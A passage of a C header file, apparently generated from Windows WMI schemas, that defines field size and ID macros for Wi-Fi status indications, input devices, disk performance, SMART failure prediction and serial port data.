#define MSNdis_StatusDot11ScanConfirm_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusDot11ScanConfirm_NumberElements_ID 1
#define MSNdis_StatusDot11ScanConfirm_NdisStatusDot11ScanConfirmIndication_ID 2

#define MSNdis_StatusDot11MPDUMaxLengthChange_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusDot11MPDUMaxLengthChange_NumberElements_ID 1
#define MSNdis_StatusDot11MPDUMaxLengthChange_NdisStatusDot11MPDUMaxLengthChangeIndication_ID 2

#define MSNdis_StatusDot11AssociationStart_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusDot11AssociationStart_NumberElements_ID 1
#define MSNdis_StatusDot11AssociationStart_NdisStatusDot11AssociationStartIndication_ID 2

#define MSNdis_StatusDot11AssociationCompletion_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusDot11AssociationCompletion_NumberElements_ID 1
#define MSNdis_StatusDot11AssociationCompletion_NdisStatusDot11AssociationCompletionIndication_ID 2

#define MSNdis_StatusDot11ConnectionStart_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusDot11ConnectionStart_NumberElements_ID 1
#define MSNdis_StatusDot11ConnectionStart_NdisStatusDot11ConnectionStartIndication_ID 2

#define MSNdis_StatusDot11ConnectionCompletion_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusDot11ConnectionCompletion_NumberElements_ID 1
#define MSNdis_StatusDot11ConnectionCompletion_NdisStatusDot11ConnectionCompletionIndication_ID 2

#define MSNdis_StatusDot11RoamingStart_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusDot11RoamingStart_NumberElements_ID 1
#define MSNdis_StatusDot11RoamingStart_NdisStatusDot11RoamingStartIndication_ID 2

#define MSNdis_StatusDot11RoamingCompletion_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusDot11RoamingCompletion_NumberElements_ID 1
#define MSNdis_StatusDot11RoamingCompletion_NdisStatusDot11RoamingCompletionIndication_ID 2

#define MSNdis_StatusDot11Disassociation_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusDot11Disassociation_NumberElements_ID 1
#define MSNdis_StatusDot11Disassociation_NdisStatusDot11DisassociationIndication_ID 2

#define MSNdis_StatusDot11TkipmicFailure_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusDot11TkipmicFailure_NumberElements_ID 1
#define MSNdis_StatusDot11TkipmicFailure_NdisStatusDot11TkipmicFailureIndication_ID 2

#define MSNdis_StatusDot11PmkidCandidateList_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusDot11PmkidCandidateList_NumberElements_ID 1
#define MSNdis_StatusDot11PmkidCandidateList_NdisStatusDot11PmkidCandidateListIndication_ID 2

#define MSNdis_StatusDot11PhyStateChange_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusDot11PhyStateChange_NumberElements_ID 1
#define MSNdis_StatusDot11PhyStateChange_NdisStatusDot11PhyStateChangeIndication_ID 2

#define MSNdis_StatusDot11LinkQuality_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_StatusDot11LinkQuality_NumberElements_ID 1
#define MSNdis_StatusDot11LinkQuality_NdisStatusDot11LinkQualityIndication_ID 2

#define KEYBOARD_PORT_WMI_STD_I8042 0
#define KEYBOARD_PORT_WMI_STD_SERIAL 1
#define KEYBOARD_PORT_WMI_STD_USB 2
#define KEYBOARD_PORT_WMI_STD_DATA_ConnectorType_SIZE sizeof(ULONG)
#define KEYBOARD_PORT_WMI_STD_DATA_ConnectorType_ID 1
#define KEYBOARD_PORT_WMI_STD_DATA_DataQueueSize_SIZE sizeof(ULONG)
#define KEYBOARD_PORT_WMI_STD_DATA_DataQueueSize_ID 2
#define KEYBOARD_PORT_WMI_STD_DATA_ErrorCount_SIZE sizeof(ULONG)
#define KEYBOARD_PORT_WMI_STD_DATA_ErrorCount_ID 3
#define KEYBOARD_PORT_WMI_STD_DATA_FunctionKeys_SIZE sizeof(ULONG)
#define KEYBOARD_PORT_WMI_STD_DATA_FunctionKeys_ID 4
#define KEYBOARD_PORT_WMI_STD_DATA_Indicators_SIZE sizeof(ULONG)
#define KEYBOARD_PORT_WMI_STD_DATA_Indicators_ID 5

#define KEYBOARD_PORT_WMI_STD_DATA_SIZE (FIELD_OFFSET(KEYBOARD_PORT_WMI_STD_DATA, Indicators) + KEYBOARD_PORT_WMI_STD_DATA_Indicators_SIZE)

#define KEYBOARD_ID_EX_Type_SIZE sizeof(ULONG)
#define KEYBOARD_ID_EX_Type_ID 1
#define KEYBOARD_ID_EX_Subtype_SIZE sizeof(ULONG)
#define KEYBOARD_ID_EX_Subtype_ID 2

#define KEYBOARD_ID_EX_SIZE (FIELD_OFFSET(KEYBOARD_ID_EX, Subtype) + KEYBOARD_ID_EX_Subtype_SIZE)

#define POINTER_PORT_WMI_STD_I8042 0
#define POINTER_PORT_WMI_STD_SERIAL 1
#define POINTER_PORT_WMI_STD_USB 2
#define POINTER_PORT_WMI_STD_DATA_ConnectorType_SIZE sizeof(ULONG)
#define POINTER_PORT_WMI_STD_DATA_ConnectorType_ID 1
#define POINTER_PORT_WMI_STD_DATA_DataQueueSize_SIZE sizeof(ULONG)
#define POINTER_PORT_WMI_STD_DATA_DataQueueSize_ID 2
#define POINTER_PORT_WMI_STD_DATA_ErrorCount_SIZE sizeof(ULONG)
#define POINTER_PORT_WMI_STD_DATA_ErrorCount_ID 3
#define POINTER_PORT_WMI_STD_DATA_Buttons_SIZE sizeof(ULONG)
#define POINTER_PORT_WMI_STD_DATA_Buttons_ID 4
#define POINTER_PORT_WMI_STD_MOUSE 0
#define POINTER_PORT_WMI_STD_POINTER 1
#define POINTER_PORT_WMI_ABSOLUTE_POINTER 2
#define POINTER_PORT_WMI_TABLET 3
#define POINTER_PORT_WMI_TOUCH_SCRENE 4
#define POINTER_PORT_WMI_PEN 5
#define POINTER_PORT_WMI_TRACK_BALL 6
#define POINTER_PORT_WMI_OTHER 256
#define POINTER_PORT_WMI_STD_DATA_HardwareType_SIZE sizeof(ULONG)
#define POINTER_PORT_WMI_STD_DATA_HardwareType_ID 5

#define POINTER_PORT_WMI_STD_DATA_SIZE (FIELD_OFFSET(POINTER_PORT_WMI_STD_DATA, HardwareType) + POINTER_PORT_WMI_STD_DATA_HardwareType_SIZE)

#define MSMouse_ClassInformation_DeviceId_SIZE sizeof(ULONGLONG)
#define MSMouse_ClassInformation_DeviceId_ID 1

#define MSMouse_ClassInformation_SIZE (FIELD_OFFSET(MSMouse_ClassInformation, DeviceId) + MSMouse_ClassInformation_DeviceId_SIZE)

#define MSKeyboard_ClassInformation_DeviceId_SIZE sizeof(ULONGLONG)
#define MSKeyboard_ClassInformation_DeviceId_ID 1

#define MSKeyboard_ClassInformation_SIZE (FIELD_OFFSET(MSKeyboard_ClassInformation, DeviceId) + MSKeyboard_ClassInformation_DeviceId_SIZE)

#define AGP_STD_DATA_ApertureBase_SIZE sizeof(ULONGLONG)
#define AGP_STD_DATA_ApertureBase_ID 1
#define AGP_STD_DATA_ApertureLength_SIZE sizeof(ULONG)
#define AGP_STD_DATA_ApertureLength_ID 2
#define AGP_STD_DATA_AgpStatus_SIZE sizeof(ULONG)
#define AGP_STD_DATA_AgpStatus_ID 3
#define AGP_STD_DATA_AgpCommand_SIZE sizeof(ULONG)
#define AGP_STD_DATA_AgpCommand_ID 4

#define AGP_STD_DATA_SIZE (FIELD_OFFSET(AGP_STD_DATA, AgpCommand) + AGP_STD_DATA_AgpCommand_SIZE)

#define MSAcpi_ThermalZoneTemperature_ThermalStamp_SIZE sizeof(ULONG)
#define MSAcpi_ThermalZoneTemperature_ThermalStamp_ID 1
#define MSAcpi_ThermalZoneTemperature_ThermalConstant1_SIZE sizeof(ULONG)
#define MSAcpi_ThermalZoneTemperature_ThermalConstant1_ID 2
#define MSAcpi_ThermalZoneTemperature_ThermalConstant2_SIZE sizeof(ULONG)
#define MSAcpi_ThermalZoneTemperature_ThermalConstant2_ID 3
#define MSAcpi_ThermalZoneTemperature_Reserved_SIZE sizeof(ULONG)
#define MSAcpi_ThermalZoneTemperature_Reserved_ID 4
#define MSAcpi_ThermalZoneTemperature_SamplingPeriod_SIZE sizeof(ULONG)
#define MSAcpi_ThermalZoneTemperature_SamplingPeriod_ID 5
#define MSAcpi_ThermalZoneTemperature_CurrentTemperature_SIZE sizeof(ULONG)
#define MSAcpi_ThermalZoneTemperature_CurrentTemperature_ID 6
#define MSAcpi_ThermalZoneTemperature_PassiveTripPoint_SIZE sizeof(ULONG)
#define MSAcpi_ThermalZoneTemperature_PassiveTripPoint_ID 7
#define MSAcpi_ThermalZoneTemperature_CriticalTripPoint_SIZE sizeof(ULONG)
#define MSAcpi_ThermalZoneTemperature_CriticalTripPoint_ID 8
#define MSAcpi_ThermalZoneTemperature_ActiveTripPointCount_SIZE sizeof(ULONG)
#define MSAcpi_ThermalZoneTemperature_ActiveTripPointCount_ID 9
#define MSAcpi_ThermalZoneTemperature_ActiveTripPoint_SIZE sizeof(ULONG[10])
#define MSAcpi_ThermalZoneTemperature_ActiveTripPoint_ID 10

#define MSAcpi_ThermalZoneTemperature_SIZE (FIELD_OFFSET(MSAcpi_ThermalZoneTemperature, ActiveTripPoint) + MSAcpi_ThermalZoneTemperature_ActiveTripPoint_SIZE)

#define WMI_DISK_GEOMETRY_Cylinders_SIZE sizeof(LONGLONG)
#define WMI_DISK_GEOMETRY_Cylinders_ID 1
#define WMI_DISK_GEOMETRY_MediaType_SIZE sizeof(ULONG)
#define WMI_DISK_GEOMETRY_MediaType_ID 2
#define WMI_DISK_GEOMETRY_TracksPerCylinder_SIZE sizeof(ULONG)
#define WMI_DISK_GEOMETRY_TracksPerCylinder_ID 3
#define WMI_DISK_GEOMETRY_SectorsPerTrack_SIZE sizeof(ULONG)
#define WMI_DISK_GEOMETRY_SectorsPerTrack_ID 4
#define WMI_DISK_GEOMETRY_BytesPerSector_SIZE sizeof(ULONG)
#define WMI_DISK_GEOMETRY_BytesPerSector_ID 5

#define WMI_DISK_GEOMETRY_SIZE (FIELD_OFFSET(WMI_DISK_GEOMETRY, BytesPerSector) + WMI_DISK_GEOMETRY_BytesPerSector_SIZE)

#define WMI_DISK_PERFORMANCE_BytesRead_SIZE sizeof(LONGLONG)
#define WMI_DISK_PERFORMANCE_BytesRead_ID 1
#define WMI_DISK_PERFORMANCE_BytesWritten_SIZE sizeof(LONGLONG)
#define WMI_DISK_PERFORMANCE_BytesWritten_ID 2
#define WMI_DISK_PERFORMANCE_ReadTime_SIZE sizeof(LONGLONG)
#define WMI_DISK_PERFORMANCE_ReadTime_ID 3
#define WMI_DISK_PERFORMANCE_WriteTime_SIZE sizeof(LONGLONG)
#define WMI_DISK_PERFORMANCE_WriteTime_ID 4
#define WMI_DISK_PERFORMANCE_IdleTime_SIZE sizeof(LONGLONG)
#define WMI_DISK_PERFORMANCE_IdleTime_ID 5
#define WMI_DISK_PERFORMANCE_ReadCount_SIZE sizeof(ULONG)
#define WMI_DISK_PERFORMANCE_ReadCount_ID 6
#define WMI_DISK_PERFORMANCE_WriteCount_SIZE sizeof(ULONG)
#define WMI_DISK_PERFORMANCE_WriteCount_ID 7
#define WMI_DISK_PERFORMANCE_QueueDepth_SIZE sizeof(ULONG)
#define WMI_DISK_PERFORMANCE_QueueDepth_ID 8
#define WMI_DISK_PERFORMANCE_SplitCount_SIZE sizeof(ULONG)
#define WMI_DISK_PERFORMANCE_SplitCount_ID 9
#define WMI_DISK_PERFORMANCE_QueryTime_SIZE sizeof(LONGLONG)
#define WMI_DISK_PERFORMANCE_QueryTime_ID 10
#define WMI_DISK_PERFORMANCE_StorageDeviceNumber_SIZE sizeof(ULONG)
#define WMI_DISK_PERFORMANCE_StorageDeviceNumber_ID 11
#define WMI_DISK_PERFORMANCE_StorageManagerName_SIZE sizeof(USHORT[8])
#define WMI_DISK_PERFORMANCE_StorageManagerName_ID 12

#define WMI_DISK_PERFORMANCE_SIZE (FIELD_OFFSET(WMI_DISK_PERFORMANCE, StorageManagerName) + WMI_DISK_PERFORMANCE_StorageManagerName_SIZE)

#define MSDiskDriver_Performance_PerfData_SIZE sizeof(WMI_DISK_PERFORMANCE)
#define MSDiskDriver_Performance_PerfData_ID 1
#define MSDiskDriver_Performance_DeviceName_ID 2

#define STORAGE_FAILURE_PREDICT_STATUS_Reason_SIZE sizeof(ULONG)
#define STORAGE_FAILURE_PREDICT_STATUS_Reason_ID 1
#define STORAGE_FAILURE_PREDICT_STATUS_PredictFailure_SIZE sizeof(BOOLEAN)
#define STORAGE_FAILURE_PREDICT_STATUS_PredictFailure_ID 2

#define STORAGE_FAILURE_PREDICT_STATUS_SIZE (FIELD_OFFSET(STORAGE_FAILURE_PREDICT_STATUS, PredictFailure) + STORAGE_FAILURE_PREDICT_STATUS_PredictFailure_SIZE)

#define STORAGE_FAILURE_PREDICT_DATA_Length_SIZE sizeof(ULONG)
#define STORAGE_FAILURE_PREDICT_DATA_Length_ID 1
#define STORAGE_FAILURE_PREDICT_DATA_VendorSpecific_SIZE sizeof(UCHAR[512])
#define STORAGE_FAILURE_PREDICT_DATA_VendorSpecific_ID 2

#define STORAGE_FAILURE_PREDICT_DATA_SIZE (FIELD_OFFSET(STORAGE_FAILURE_PREDICT_DATA, VendorSpecific) + STORAGE_FAILURE_PREDICT_DATA_VendorSpecific_SIZE)

#define ATAPI_FAILURE_PREDICT_DATA_Length_SIZE sizeof(ULONG)
#define ATAPI_FAILURE_PREDICT_DATA_Length_ID 1
#define ATAPI_FAILURE_PREDICT_DATA_VendorSpecific_SIZE sizeof(UCHAR[362])
#define ATAPI_FAILURE_PREDICT_DATA_VendorSpecific_ID 2
#define ATAPI_FAILURE_PREDICT_DATA_OfflineCollectionStatus_SIZE sizeof(UCHAR)
#define ATAPI_FAILURE_PREDICT_DATA_OfflineCollectionStatus_ID 3
#define ATAPI_FAILURE_PREDICT_DATA_SelfTestStatus_SIZE sizeof(UCHAR)
#define ATAPI_FAILURE_PREDICT_DATA_SelfTestStatus_ID 4
#define ATAPI_FAILURE_PREDICT_DATA_TotalTime_SIZE sizeof(USHORT)
#define ATAPI_FAILURE_PREDICT_DATA_TotalTime_ID 5
#define ATAPI_FAILURE_PREDICT_DATA_VendorSpecific2_SIZE sizeof(UCHAR)
#define ATAPI_FAILURE_PREDICT_DATA_VendorSpecific2_ID 6
#define ATAPI_FAILURE_PREDICT_DATA_OfflineCollectCapability_SIZE sizeof(UCHAR)
#define ATAPI_FAILURE_PREDICT_DATA_OfflineCollectCapability_ID 7
#define ATAPI_FAILURE_PREDICT_DATA_SmartCapability_SIZE sizeof(USHORT)
#define ATAPI_FAILURE_PREDICT_DATA_SmartCapability_ID 8
#define ATAPI_FAILURE_PREDICT_DATA_ErrorLogCapability_SIZE sizeof(UCHAR)
#define ATAPI_FAILURE_PREDICT_DATA_ErrorLogCapability_ID 9
#define ATAPI_FAILURE_PREDICT_DATA_VendorSpecific3_SIZE sizeof(UCHAR)
#define ATAPI_FAILURE_PREDICT_DATA_VendorSpecific3_ID 10
#define ATAPI_FAILURE_PREDICT_DATA_ShortPollTimeInMinutes_SIZE sizeof(UCHAR)
#define ATAPI_FAILURE_PREDICT_DATA_ShortPollTimeInMinutes_ID 11
#define ATAPI_FAILURE_PREDICT_DATA_ExtendedPollTimeInMinutes_SIZE sizeof(UCHAR)
#define ATAPI_FAILURE_PREDICT_DATA_ExtendedPollTimeInMinutes_ID 12
#define ATAPI_FAILURE_PREDICT_DATA_Reserved_SIZE sizeof(UCHAR[12])
#define ATAPI_FAILURE_PREDICT_DATA_Reserved_ID 13
#define ATAPI_FAILURE_PREDICT_DATA_VendorSpecific4_SIZE sizeof(UCHAR[125])
#define ATAPI_FAILURE_PREDICT_DATA_VendorSpecific4_ID 14
#define ATAPI_FAILURE_PREDICT_DATA_Checksum_SIZE sizeof(UCHAR)
#define ATAPI_FAILURE_PREDICT_DATA_Checksum_ID 15

#define ATAPI_FAILURE_PREDICT_DATA_SIZE (FIELD_OFFSET(ATAPI_FAILURE_PREDICT_DATA, Checksum) + ATAPI_FAILURE_PREDICT_DATA_Checksum_SIZE)

#define STORAGE_FAILURE_PREDICT_THRESHOLDS_VendorSpecific_SIZE sizeof(UCHAR[512])
#define STORAGE_FAILURE_PREDICT_THRESHOLDS_VendorSpecific_ID 1

#define STORAGE_FAILURE_PREDICT_THRESHOLDS_SIZE (FIELD_OFFSET(STORAGE_FAILURE_PREDICT_THRESHOLDS, VendorSpecific) + STORAGE_FAILURE_PREDICT_THRESHOLDS_VendorSpecific_SIZE)

#define STORAGE_FAILURE_PREDICT_EVENT_Length_SIZE sizeof(ULONG)
#define STORAGE_FAILURE_PREDICT_EVENT_Length_ID 1
#define STORAGE_FAILURE_PREDICT_EVENT_VendorSpecific_ID 2

#define AllowPerformanceHit     1

#define ALLOW_PERFORMANCE_HIT_IN_Allow_SIZE sizeof(BOOLEAN)
#define ALLOW_PERFORMANCE_HIT_IN_Allow_ID 1

#define ALLOW_PERFORMANCE_HIT_IN_SIZE (FIELD_OFFSET(ALLOW_PERFORMANCE_HIT_IN, Allow) + ALLOW_PERFORMANCE_HIT_IN_Allow_SIZE)

#define EnableDisableHardwareFailurePrediction     2

#define ENABLE_DISABLE_FP_IN_Enable_SIZE sizeof(BOOLEAN)
#define ENABLE_DISABLE_FP_IN_Enable_ID 1

#define ENABLE_DISABLE_FP_IN_SIZE (FIELD_OFFSET(ENABLE_DISABLE_FP_IN, Enable) + ENABLE_DISABLE_FP_IN_Enable_SIZE)

#define EnableDisableFailurePredictionPolling     3

#define ENABLE_DISABLE_FP_POLLING_IN_Period_SIZE sizeof(ULONG)
#define ENABLE_DISABLE_FP_POLLING_IN_Period_ID 1
#define ENABLE_DISABLE_FP_POLLING_IN_Enable_SIZE sizeof(BOOLEAN)
#define ENABLE_DISABLE_FP_POLLING_IN_Enable_ID 2

#define ENABLE_DISABLE_FP_POLLING_IN_SIZE (FIELD_OFFSET(ENABLE_DISABLE_FP_POLLING_IN, Enable) + ENABLE_DISABLE_FP_POLLING_IN_Enable_SIZE)

#define GetFailurePredictionCapability     4

#define GET_FP_CAPABILITY_OUT_Capability_SIZE sizeof(ULONG)
#define GET_FP_CAPABILITY_OUT_Capability_ID 1

#define GET_FP_CAPABILITY_OUT_SIZE (FIELD_OFFSET(GET_FP_CAPABILITY_OUT, Capability) + GET_FP_CAPABILITY_OUT_Capability_SIZE)

#define EnableOfflineDiags     5

#define ENABLE_OFFLINE_DIAGS_OUT_Success_SIZE sizeof(BOOLEAN)
#define ENABLE_OFFLINE_DIAGS_OUT_Success_ID 1

#define ENABLE_OFFLINE_DIAGS_OUT_SIZE (FIELD_OFFSET(ENABLE_OFFLINE_DIAGS_OUT, Success) + ENABLE_OFFLINE_DIAGS_OUT_Success_SIZE)

#define ReadLogSectors     6

#define READ_LOG_SECTORS_IN_LogAddress_SIZE sizeof(UCHAR)
#define READ_LOG_SECTORS_IN_LogAddress_ID 1
#define READ_LOG_SECTORS_IN_SectorCount_SIZE sizeof(UCHAR)
#define READ_LOG_SECTORS_IN_SectorCount_ID 2

#define READ_LOG_SECTORS_IN_SIZE (FIELD_OFFSET(READ_LOG_SECTORS_IN, SectorCount) + READ_LOG_SECTORS_IN_SectorCount_SIZE)

#define READ_LOG_SECTORS_OUT_Length_SIZE sizeof(ULONG)
#define READ_LOG_SECTORS_OUT_Length_ID 3
#define READ_LOG_SECTORS_OUT_LogSectors_ID 4

#define WriteLogSectors     7

#define WRITE_LOG_SECTORS_IN_LogAddress_SIZE sizeof(UCHAR)
#define WRITE_LOG_SECTORS_IN_LogAddress_ID 1
#define WRITE_LOG_SECTORS_IN_SectorCount_SIZE sizeof(UCHAR)
#define WRITE_LOG_SECTORS_IN_SectorCount_ID 2
#define WRITE_LOG_SECTORS_IN_Length_SIZE sizeof(ULONG)
#define WRITE_LOG_SECTORS_IN_Length_ID 3
#define WRITE_LOG_SECTORS_IN_LogSectors_ID 4

#define WRITE_LOG_SECTORS_OUT_Success_SIZE sizeof(BOOLEAN)
#define WRITE_LOG_SECTORS_OUT_Success_ID 5

#define WRITE_LOG_SECTORS_OUT_SIZE (FIELD_OFFSET(WRITE_LOG_SECTORS_OUT, Success) + WRITE_LOG_SECTORS_OUT_Success_SIZE)

#define EXECUTE_SELF_TEST_IN_Subcommand_SIZE sizeof(UCHAR)
#define EXECUTE_SELF_TEST_IN_Subcommand_ID 1

#define EXECUTE_SELF_TEST_IN_SIZE (FIELD_OFFSET(EXECUTE_SELF_TEST_IN, Subcommand) + EXECUTE_SELF_TEST_IN_Subcommand_SIZE)

#define ExecuteSelfTest     8

#define EXECUTE_SELF_TEST_OUT_ReturnCode_SIZE sizeof(ULONG)
#define EXECUTE_SELF_TEST_OUT_ReturnCode_ID 2

#define EXECUTE_SELF_TEST_OUT_SIZE (FIELD_OFFSET(EXECUTE_SELF_TEST_OUT, ReturnCode) + EXECUTE_SELF_TEST_OUT_ReturnCode_SIZE)

#define STORAGE_SCSI_INFO_EXCEPTIONS_PageSavable_SIZE sizeof(BOOLEAN)
#define STORAGE_SCSI_INFO_EXCEPTIONS_PageSavable_ID 1
#define STORAGE_SCSI_INFO_EXCEPTIONS_Flags_SIZE sizeof(UCHAR)
#define STORAGE_SCSI_INFO_EXCEPTIONS_Flags_ID 2
#define STORAGE_SCSI_INFO_EXCEPTIONS_MRIE_SIZE sizeof(UCHAR)
#define STORAGE_SCSI_INFO_EXCEPTIONS_MRIE_ID 3
#define STORAGE_SCSI_INFO_EXCEPTIONS_Padding_SIZE sizeof(UCHAR)
#define STORAGE_SCSI_INFO_EXCEPTIONS_Padding_ID 4
#define STORAGE_SCSI_INFO_EXCEPTIONS_IntervalTimer_SIZE sizeof(ULONG)
#define STORAGE_SCSI_INFO_EXCEPTIONS_IntervalTimer_ID 5
#define STORAGE_SCSI_INFO_EXCEPTIONS_ReportCount_SIZE sizeof(ULONG)
#define STORAGE_SCSI_INFO_EXCEPTIONS_ReportCount_ID 6

#define STORAGE_SCSI_INFO_EXCEPTIONS_SIZE (FIELD_OFFSET(STORAGE_SCSI_INFO_EXCEPTIONS, ReportCount) + STORAGE_SCSI_INFO_EXCEPTIONS_ReportCount_SIZE)

#define MSIde_PortDeviceInfo_Bus_SIZE sizeof(UCHAR)
#define MSIde_PortDeviceInfo_Bus_ID 1
#define MSIde_PortDeviceInfo_Target_SIZE sizeof(UCHAR)
#define MSIde_PortDeviceInfo_Target_ID 2
#define MSIde_PortDeviceInfo_Lun_SIZE sizeof(UCHAR)
#define MSIde_PortDeviceInfo_Lun_ID 3

#define MSIde_PortDeviceInfo_SIZE (FIELD_OFFSET(MSIde_PortDeviceInfo, Lun) + MSIde_PortDeviceInfo_Lun_SIZE)

#define MSSerial_PortName_PortName_ID 1

#define SERIAL_WMI_COMM_DATA_BaudRate_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMM_DATA_BaudRate_ID 1
#define SERIAL_WMI_COMM_DATA_BitsPerByte_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMM_DATA_BitsPerByte_ID 2
#define SERIAL_WMI_PARITY_NONE 0
#define SERIAL_WMI_PARITY_ODD 1
#define SERIAL_WMI_PARITY_EVEN 2
#define SERIAL_WMI_PARITY_SPACE 3
#define SERIAL_WMI_PARITY_MARK 4
#define SERIAL_WMI_COMM_DATA_Parity_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMM_DATA_Parity_ID 3
#define SERIAL_WMI_COMM_DATA_ParityCheckEnable_SIZE sizeof(BOOLEAN)
#define SERIAL_WMI_COMM_DATA_ParityCheckEnable_ID 4
#define SERIAL_WMI_STOP_1 0
#define SERIAL_WMI_STOP_1_5 1
#define SERIAL_WMI_STOP_2 2
#define SERIAL_WMI_COMM_DATA_StopBits_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMM_DATA_StopBits_ID 5
#define SERIAL_WMI_COMM_DATA_XoffCharacter_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMM_DATA_XoffCharacter_ID 6
#define SERIAL_WMI_COMM_DATA_XoffXmitThreshold_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMM_DATA_XoffXmitThreshold_ID 7
#define SERIAL_WMI_COMM_DATA_XonCharacter_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMM_DATA_XonCharacter_ID 8
#define SERIAL_WMI_COMM_DATA_XonXmitThreshold_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMM_DATA_XonXmitThreshold_ID 9
#define SERIAL_WMI_COMM_DATA_MaximumBaudRate_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMM_DATA_MaximumBaudRate_ID 10
#define SERIAL_WMI_COMM_DATA_MaximumOutputBufferSize_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMM_DATA_MaximumOutputBufferSize_ID 11
#define SERIAL_WMI_COMM_DATA_MaximumInputBufferSize_SIZE sizeof(ULONG)
#define SERIAL_WMI_COMM_DATA_MaximumInputBufferSize_ID 12
#define SERIAL_WMI_COMM_DATA_Support16BitMode_SIZE sizeof(BOOLEAN)
#define SERIAL_WMI_COMM_DATA_Support16BitMode_ID 13
#define SERIAL_WMI_COMM_DATA_SupportDTRDSR_SIZE sizeof(BOOLEAN)
#define SERIAL_WMI_COMM_DATA_SupportDTRDSR_ID 14
#define SERIAL_WMI_COMM_DATA_SupportIntervalTimeouts_SIZE sizeof(BOOLEAN)
#define SERIAL_WMI_COMM_DATA_SupportIntervalTimeouts_ID 15
#define SERIAL_WMI_COMM_DATA_SupportParityCheck_SIZE sizeof(BOOLEAN)
#define SERIAL_WMI_COMM_DATA_SupportParityCheck_ID 16
#define SERIAL_WMI_COMM_DATA_SupportRTSCTS_SIZE sizeof(BOOLEAN)
#define SERIAL_WMI_COMM_DATA_SupportRTSCTS_ID 17
#define SERIAL_WMI_COMM_DATA_SupportXonXoff_SIZE sizeof(BOOLEAN)
#define SERIAL_WMI_COMM_DATA_SupportXonXoff_ID 18
#define SERIAL_WMI_COMM_DATA_SettableBaudRate_SIZE sizeof(BOOLEAN)
#define SERIAL_WMI_COMM_DATA_SettableBaudRate_ID 19
#define SERIAL_WMI_COMM_DATA_SettableDataBits_SIZE sizeof(BOOLEAN)
#define SERIAL_WMI_COMM_DATA_SettableDataBits_ID 20
#define SERIAL_WMI_COMM_DATA_SettableFlowControl_SIZE sizeof(BOOLEAN)
#define SERIAL_WMI_COMM_DATA_SettableFlowControl_ID 21
#define SERIAL_WMI_COMM_DATA_SettableParity_SIZE sizeof(BOOLEAN)
#define SERIAL_WMI_COMM_DATA_SettableParity_ID 22
#define SERIAL_WMI_COMM_DATA_SettableParityCheck_SIZE sizeof(BOOLEAN)
#define SERIAL_WMI_COMM_DATA_SettableParityCheck_ID 23
#define SERIAL_WMI_COMM_DATA_SettableStopBits_SIZE sizeof(BOOLEAN)
#define SERIAL_WMI_COMM_DATA_SettableStopBits_ID 24
#define SERIAL_WMI_COMM_DATA_IsBusy_SIZE sizeof(BOOLEAN)
#define SERIAL_WMI_COMM_DATA_IsBusy_ID 25

#define SERIAL_WMI_COMM_DATA_SIZE (FIELD_OFFSET(SERIAL_WMI_COMM_DATA, IsBusy) + SERIAL_WMI_COMM_DATA_IsBusy_SIZE)

#define SERIAL_WMI_HW_DATA_IrqNumber_SIZE sizeof(ULONG)
#define SERIAL_WMI_HW_DATA_IrqNumber_ID 1
#define SERIAL_WMI_HW_DATA_IrqVector_SIZE sizeof(ULONG)
#define SERIAL_WMI_HW_DATA_IrqVector_ID 2
#define SERIAL_WMI_HW_DATA_IrqLevel_SIZE sizeof(ULONG)
#define SERIAL_WMI_HW_DATA_IrqLevel_ID 3
#define SERIAL_WMI_HW_DATA_IrqAffinityMask_SIZE sizeof(ULONGLONG)
#define SERIAL_WMI_HW_DATA_IrqAffinityMask_ID 4
#define SERIAL_WMI_INTTYPE_LATCHED 0
#define SERIAL_WMI_INTTYPE_LEVEL 1
#define SERIAL_WMI_HW_DATA_InterruptType_SIZE sizeof(ULONG)
#define SERIAL_WMI_HW_DATA_InterruptType_ID 5
#define SERIAL_WMI_HW_DATA_BaseIOAddress_SIZE sizeof(ULONGLONG)
#define SERIAL_WMI_HW_DATA_BaseIOAddress_ID 6

#define SERIAL_WMI_HW_DATA_SIZE (FIELD_OFFSET(SERIAL_WMI_HW_DATA, BaseIOAddress) + SERIAL_WMI_HW_DATA_BaseIOAddress_SIZE)

#define SERIAL_WMI_PERF_DATA_ReceivedCount_SIZE sizeof(ULONG)
#define SERIAL_WMI_PERF_DATA_ReceivedCount_ID 1
#define SERIAL_WMI_PERF_DATA_TransmittedCount_SIZE sizeof(ULONG)
#define SERIAL_WMI_PERF_DATA_TransmittedCount_ID 2
#define SERIAL_WMI_PERF_DATA_FrameErrorCount_SIZE sizeof(ULONG)
#define SERIAL_WMI_PERF_DATA_FrameErrorCount_ID 3
#define SERIAL_WMI_PERF_DATA_SerialOverrunErrorCount_SIZE sizeof(ULONG)
#define SERIAL_WMI_PERF_DATA_SerialOverrunErrorCount_ID 4
#define SERIAL_WMI_PERF_DATA_BufferOverrunErrorCount_SIZE sizeof(ULONG)
#define SERIAL_WMI_PERF_DATA_BufferOverrunErrorCount_ID 5
#define SERIAL_WMI_PERF_DATA_ParityErrorCount_SIZE sizeof(ULONG)
#define SERIAL_WMI_PERF_DATA_ParityErrorCount_ID 6

#define SERIAL_WMI_PERF_DATA_SIZE (FIELD_OFFSET(SERIAL_WMI_PERF_DATA, ParityErrorCount) + SERIAL_WMI_PERF_DATA_ParityErrorCount_SIZE)

#define SERIAL_WMI_COMMPROP_wPacketLength_SIZE sizeof(USHORT)
